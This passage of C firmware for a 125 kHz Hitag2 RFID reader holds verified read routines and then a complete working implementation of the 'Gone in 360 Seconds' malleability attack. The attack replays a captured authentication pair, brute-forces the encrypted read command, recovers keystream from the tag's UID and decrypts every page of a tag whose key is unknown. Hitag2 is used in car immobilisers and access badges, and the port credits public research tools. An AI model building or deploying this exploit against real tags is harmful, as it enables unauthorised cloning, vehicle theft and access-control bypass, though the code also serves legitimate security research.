        if (stage > HITAG2_FAIL_UID) {
            memcpy(seen_uid, pages[HITAG2_PAGE_UID], HITAG2_PAGE_SIZE);
        }
        if (stage > g_fail_stage) {
            g_fail_stage = stage;  /* report the furthest any attempt got */
        }
        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
    }
    g_attempts = HITAG2_SESSION_ATTEMPTS;
    /* The next attempt wipes pages[]; hand back the last UID actually read. */
    memcpy(pages[HITAG2_PAGE_UID], seen_uid, HITAG2_PAGE_SIZE);
    return false;
}

bool hitag2_reader_read(const uint8_t password[HITAG2_PAGE_SIZE],
                         uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
                         uint32_t timeout_ms) {
    return hitag2_read_verified(hitag2_read_session, password, pages, timeout_ms);
}

bool hitag2_reader_crypto_read(const uint8_t key[HITAG2_KEY_SIZE],
                                uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
                                uint32_t timeout_ms) {
    return hitag2_read_verified(hitag2_crypto_read_session, key, pages, timeout_ms);
}

/* -----------------------------------------------------------------------
 * Malleability crack (key-agnostic). Ported from the "Gone in 360 Seconds"
 * attack as implemented in RfidResearchGroup/proxmark3 armsrc/hitag2_crack.c
 * (ht2_crack1), itself from AdamLaurie/RFIDler. No cipher is run here: the
 * tag issues no challenge, so a captured {nR}{aR} is replayed to authenticate,
 * the read-page-0 command is found by brute force, and keystream is recovered
 * from the id, which is known plaintext (sent in clear during auth). This
 * reads a crypto-mode tag whose key is unknown. Needs one valid {nR}{aR}.
 *
 * Every command here is <=64 bits, so the existing <=64-bit TX path is reused
 * as is. Each e-cmd cold-starts its own power-up, as the read sessions do, to
 * avoid the field-held timeslot reset seen on this hardware.
 * --------------------------------------------------------------------- */

/* "1100000111" -- read page 0, as a binarray (one bit per byte). */
static const uint8_t hitag2_read_p0_cmd[10] = {1, 1, 0, 0, 0, 0, 0, 1, 1, 1};

static void hitag2_crack_xor(uint8_t *dst, const uint8_t *a, const uint8_t *b, size_t n) {
    for (size_t i = 0; i < n; i++) {
        dst[i] = a[i] ^ b[i];
    }
}

/* MSB-first, matching hitag2_send_bits_bytes / hitag2_receive_frame packing. */
static void hitag2_crack_bits_to_bytes(const uint8_t *bits, uint8_t nbits, uint8_t *bytes) {
    memset(bytes, 0, (size_t)(nbits + 7) / 8);
    for (uint8_t i = 0; i < nbits; i++) {
        bytes[i / 8] |= (uint8_t)((bits[i] & 1u) << (7 - (i % 8)));
    }
}

static void hitag2_crack_bytes_to_bits(const uint8_t *bytes, uint8_t nbits, uint8_t *bits) {
    for (uint8_t i = 0; i < nbits; i++) {
        bits[i] = (bytes[i / 8] >> (7 - (i % 8))) & 1u;
    }
}

/* Cold-start replay: START_AUTH -> id, nrar -> (ignored page 3), e-cmd -> resp.
 * resp_bits gets the 32-bit response as a binarray; true only on a 32-bit reply. */
static bool hitag2_crack_send_e_cmd(uint8_t *resp_bits, const uint8_t *nrar_bits,
                                    const uint8_t *cmd_bits, uint8_t len, uint32_t timeout_ms) {
    uint8_t uid[4];
    if (!hitag2_reader_get_uid(uid, timeout_ms)) {
        stop_lf_125khz_radio();
        hitag2_hfclk_release();
        return false;
    }

    uint8_t nrar_bytes[8];
    hitag2_crack_bits_to_bytes(nrar_bits, 64, nrar_bytes);
    uint8_t ignore[4];
    if (!hitag2_tx_rx_bytes(nrar_bytes, 64, ignore, 32, 0, timeout_ms)) {
        stop_lf_125khz_radio();
        hitag2_hfclk_release();
        return false;
    }

    uint8_t cmd_bytes[8];
    hitag2_crack_bits_to_bytes(cmd_bits, len, cmd_bytes);
    uint8_t resp_bytes[4];
    bool ok = hitag2_tx_rx_bytes(cmd_bytes, len, resp_bytes, 32, 0, timeout_ms);
    stop_lf_125khz_radio();
    hitag2_hfclk_release();
    if (!ok) {
        return false;
    }
    hitag2_crack_bytes_to_bits(resp_bytes, 32, resp_bits);
    return true;
}

/* The CU-vs-CU link drops reply bits and Hitag2 replies carry no checksum, so a
 * single read can be wrong. Read until two of up to HT2_CRACK_TRIES reads agree,
 * same tactic as the password/crypto reader. resp_bits gets the agreed response. */
#define HT2_CRACK_TRIES  8
#define HT2_CRACK_KEEP   4
static bool hitag2_crack_read_verified(uint8_t *resp_bits, const uint8_t *nrar,
                                       const uint8_t *cmd_bits, uint8_t len, uint32_t timeout_ms) {
    uint8_t seen[HT2_CRACK_KEEP][32];
    uint8_t n_seen = 0;
    for (uint8_t t = 0; t < HT2_CRACK_TRIES; t++) {
        bsp_wdt_feed();
        uint8_t r[32];
        if (hitag2_crack_send_e_cmd(r, nrar, cmd_bits, len, timeout_ms)) {
            for (uint8_t i = 0; i < n_seen; i++) {
                if (memcmp(seen[i], r, 32) == 0) {
                    memcpy(resp_bits, r, 32);
                    return true;
                }
            }
            if (n_seen < HT2_CRACK_KEEP) {
                memcpy(seen[n_seen++], r, 32);
            }
        }
        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
    }
    return false;
}

/* Hold bits 5,7,8,9 at 0 and sweep the other six until one e-cmd is answered. */
static bool hitag2_crack_find_valid_e_cmd(uint8_t *e_cmd, const uint8_t *nrar, uint32_t timeout_ms) {
    for (uint8_t a = 0; a < 2; a++)
    for (uint8_t b = 0; b < 2; b++)
    for (uint8_t c = 0; c < 2; c++)
    for (uint8_t d = 0; d < 2; d++)
    for (uint8_t e = 0; e < 2; e++)
    for (uint8_t g = 0; g < 2; g++) {
        bsp_wdt_feed();  /* the full sweep can outlast the 5 s watchdog */
        uint8_t guess[10] = { a, b, c, d, e, 0, g, 0, 0, 0 };
        uint8_t resp[32];
        if (hitag2_crack_send_e_cmd(resp, nrar, guess, 10, timeout_ms)) {
            memcpy(e_cmd, guess, 10);
            return true;
        }
        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
    }
    return false;
}

/* Recover 42 keystream bits from the known id, then confirm with a 40-bit
 * extended read-page-0 (4x the command): a 32-bit reply means the stream is right. */
static bool hitag2_crack_test_e_p0cmd(uint8_t *keybits, const uint8_t *nrar,
                                      const uint8_t *e_cmd, const uint8_t *uid,
                                      const uint8_t *e_uid, uint32_t timeout_ms) {
    uint8_t cipher[42];
    memcpy(cipher, e_cmd, 10);
    memcpy(cipher + 10, e_uid, 32);

    uint8_t plain[42];
    memcpy(plain, hitag2_read_p0_cmd, 10);
    memcpy(plain + 10, uid, 32);

    hitag2_crack_xor(keybits, plain, cipher, 42);

    uint8_t e_ext[40];
    for (uint8_t i = 0; i < 4; i++) {
        hitag2_crack_xor(e_ext + i * 10, hitag2_read_p0_cmd, keybits + i * 10, 10);
    }
    /* Any 32-bit reply confirms the keystream; retry so link noise does not
     * discard the right candidate. */
    uint8_t resp[32];
    for (uint8_t t = 0; t < HT2_CRACK_TRIES; t++) {
        bsp_wdt_feed();
        if (hitag2_crack_send_e_cmd(resp, nrar, e_ext, 40, timeout_ms)) {
            return true;
        }
        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
    }
    return false;
}

/* From the first valid e-cmd, sweep the inverted + 3 page bits (both halves)
 * to find the read-page-0 command and its keystream. */
static bool hitag2_crack_find_e_page0(uint8_t *keybits, const uint8_t *e_first,
                                      const uint8_t *nrar, const uint8_t *uid, uint32_t timeout_ms) {
    for (uint8_t a = 0; a < 2; a++)
    for (uint8_t b = 0; b < 2; b++)
    for (uint8_t c = 0; c < 2; c++)
    for (uint8_t d = 0; d < 2; d++) {
        bsp_wdt_feed();
        uint8_t guess[10];
        memcpy(guess, e_first, 10);
        if (a) { guess[5] = !guess[5]; guess[0] = !guess[0]; }
        if (b) { guess[7] = !guess[7]; guess[2] = !guess[2]; }
        if (c) { guess[8] = !guess[8]; guess[3] = !guess[3]; }
        if (d) { guess[9] = !guess[9]; guess[4] = !guess[4]; }

        uint8_t e_uid[32];
        if (hitag2_crack_read_verified(e_uid, nrar, guess, 10, timeout_ms)) {
            if (hitag2_crack_test_e_p0cmd(keybits, nrar, guess, uid, e_uid, timeout_ms)) {
                return true;
            }
        }
        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
    }
    return false;
}

/* Read one page with the recovered keystream: encrypt the page command,
 * decrypt the 32-bit reply. page_out gets 4 bytes; false on no answer. */
static bool hitag2_crack_read_page(uint8_t *page_out, uint8_t page, const uint8_t *nrar,
                                   const uint8_t *keybits, uint32_t timeout_ms) {
    uint8_t cmd[10];
    memcpy(cmd, hitag2_read_p0_cmd, 10);
    if (page & 0x1) { cmd[9] = !cmd[9]; cmd[4] = !cmd[4]; }
    if (page & 0x2) { cmd[8] = !cmd[8]; cmd[3] = !cmd[3]; }
    if (page & 0x4) { cmd[7] = !cmd[7]; cmd[2] = !cmd[2]; }

    uint8_t e_cmd[10];
    hitag2_crack_xor(e_cmd, cmd, keybits, 10);

    uint8_t e_resp[32];
    if (!hitag2_crack_read_verified(e_resp, nrar, e_cmd, 10, timeout_ms)) {
        return false;
    }
    uint8_t resp[32];
    hitag2_crack_xor(resp, e_resp, keybits + 10, 32);
    hitag2_crack_bits_to_bytes(resp, 32, page_out);
    return true;
}

uint8_t hitag2_reader_crack(const uint8_t nrar[8],
                            uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
                            uint32_t timeout_ms) {
    memset(pages, 0, HITAG2_NUM_PAGES * HITAG2_PAGE_SIZE);

    uint8_t uid_bytes[4];
    if (!hitag2_reader_get_uid(uid_bytes, timeout_ms)) {
        stop_lf_125khz_radio();
        hitag2_hfclk_release();
        return HITAG2_CRACK_NO_UID;
    }
    stop_lf_125khz_radio();
    hitag2_hfclk_release();
    memcpy(pages[HITAG2_PAGE_UID], uid_bytes, 4);

    uint8_t nrar_bits[64];
    hitag2_crack_bytes_to_bits(nrar, 64, nrar_bits);
    uint8_t uid_bits[32];
    hitag2_crack_bytes_to_bits(uid_bytes, 32, uid_bits);

    uint8_t e_first[10];
    if (!hitag2_crack_find_valid_e_cmd(e_first, nrar_bits, timeout_ms)) {
        return HITAG2_CRACK_NO_ECMD;
    }

    uint8_t keybits[42];
    if (!hitag2_crack_find_e_page0(keybits, e_first, nrar_bits, uid_bits, timeout_ms)) {
        return HITAG2_CRACK_NO_PAGE0;
    }

    for (uint8_t page = 1; page < HITAG2_NUM_PAGES; page++) {
        bsp_wdt_feed();
        hitag2_crack_read_page(pages[page], page, nrar_bits, keybits, timeout_ms);
        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
    }
    return HITAG2_CRACK_OK;
}
